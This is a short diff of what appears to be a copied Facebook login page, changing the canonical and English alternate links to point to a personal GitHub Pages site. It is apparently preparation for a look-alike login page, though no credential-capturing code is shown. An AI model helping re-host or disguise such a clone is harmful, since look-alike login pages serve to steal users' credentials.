@@ -11,7 +11,7 @@
   <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y1/l/0,cross/LL0mYNfEU0b.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="rw21N2V" crossorigin="anonymous"> 
   <meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
   <meta name="description" content="Create an account or log in to Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates.">
-  <link rel="canonical" href="https://www.facebook.com/">
+  <link rel="canonical" href="https://amaldocs2.github.io/amaldocs/">
   <meta property="og:site_name" content="Facebook">
   <meta property="og:type" content="website">
   <meta property="og:title" content="Facebook – log in or sign up">
@@ -25,7 +25,7 @@
   <link rel="alternate" hreflang="ca" href="https://ca-es.facebook.com/">
   <link rel="alternate" hreflang="da" href="https://da-dk.facebook.com/">
   <link rel="alternate" hreflang="el" href="https://el-gr.facebook.com/">
-  <link rel="alternate" hreflang="en" href="https://www.facebook.com/">
+  <link rel="alternate" hreflang="en" href="https://amaldocs2.github.io/amaldocs/">
   <link rel="alternate" hreflang="es" href="https://es-la.facebook.com/">
   <link rel="alternate" hreflang="es-es" href="https://es-es.facebook.com/">
   <link rel="alternate" hreflang="fa" href="https://fa-ir.facebook.com/">
